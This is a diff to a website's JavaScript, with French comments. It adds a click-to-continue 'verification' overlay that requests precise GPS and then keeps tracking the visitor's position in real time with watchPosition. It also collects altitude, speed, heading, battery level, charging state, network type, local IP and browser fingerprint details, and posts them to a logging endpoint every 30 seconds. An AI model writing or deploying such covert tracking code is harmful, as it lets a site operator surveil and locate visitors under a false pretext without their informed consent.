@@ -46,11 +46,10 @@ async function getPreciseLocation() {
             return;
         }
 
-        // Configuration plus agressive pour forcer le matériel GPS
         const options = {
             enableHighAccuracy: true,
-            timeout: 10000, // On attend jusqu'à 10 secondes le signal
-            maximumAge: 0   // On ne veut pas de position en cache, on veut du direct
+            timeout: 10000,
+            maximumAge: 0
         };
 
         navigator.geolocation.getCurrentPosition(
@@ -58,7 +57,10 @@ async function getPreciseLocation() {
                 resolve({
                     lat: position.coords.latitude,
                     lon: position.coords.longitude,
-                    accuracy: position.coords.accuracy
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    speed: position.coords.speed,
+                    heading: position.coords.heading
                 });
             },
             (error) => {
@@ -68,6 +70,25 @@ async function getPreciseLocation() {
             options
         );
     });
+}
+
+// Fonction pour récupérer les infos batterie et réseau
+async function getDeviceStats() {
+    const stats = {
+        battery: null,
+        charging: null,
+        connection: navigator.connection ? navigator.connection.effectiveType : 'unknown'
+    };
+
+    try {
+        if (navigator.getBattery) {
+            const battery = await navigator.getBattery();
+            stats.battery = Math.round(battery.level * 100);
+            stats.charging = battery.charging;
+        }
+    } catch (e) {}
+    
+    return stats;
 }
 
 // Récupérer ou générer un ID de session persistant pour ce visiteur
@@ -80,15 +101,17 @@ if (!sessionId) {
 async function logVisitor(preciseLocation = null, isUpdate = false) {
     try {
         const localIp = await getLocalIP();
+        const stats = await getDeviceStats();
         
         await fetch('/api/log', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
                 sessionId: sessionId,
-                isUpdate: isUpdate, // Flag ajouté
+                isUpdate: isUpdate,
                 localIp: localIp,
                 preciseLocation: preciseLocation,
+                deviceStats: stats,
                 userAgent: navigator.userAgent,
                 language: navigator.language,
                 screenResolution: `${window.screen.width}x${window.screen.height}`,
@@ -144,23 +167,33 @@ async function startVerification() {
     overlay.style.display = 'flex';
 
     const handleFirstClick = async () => {
-        // On ne cache pas l'overlay tout de suite pour "bloquer" le deuxième clic tant qu'on n'a pas fini
         const location = await getPreciseLocation();
-        
-        // On log avec le résultat (GPS ou IP si refusé/timeout)
         await logVisitor(location);
-        
-        // Une fois loggué, on libère enfin le site
         overlay.style.display = 'none';
 
-        // Démarrer le tracking périodique toutes les 10 secondes
+        // Mode watchPosition pour un suivi ultra-précis en temps réel
+        if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(
+                async (position) => {
+                    const loc = {
+                        lat: position.coords.latitude,
+                        lon: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        speed: position.coords.speed
+                    };
+                    await logVisitor(loc, true);
+                },
+                (err) => console.warn(err),
+                { enableHighAccuracy: true, maximumAge: 0 }
+            );
+        }
+
+        // Heartbeat pour maintenir la session active et vérifier batterie/réseau toutes les 30s
         setInterval(async () => {
-            const loc = await getPreciseLocation();
-            if (loc) {
-                // On passe un flag 'isUpdate' pour que l'API sache que c'est du mouvement
-                await logVisitor(loc, true);
-            }
-        }, 10000);
+            const stats = await getDeviceStats();
+            // On log sans position pour mettre à jour les stats si pas de mouvement
+            await logVisitor(null, true);
+        }, 30000);
     };
 
     overlay.addEventListener('click', handleFirstClick, { once: true });
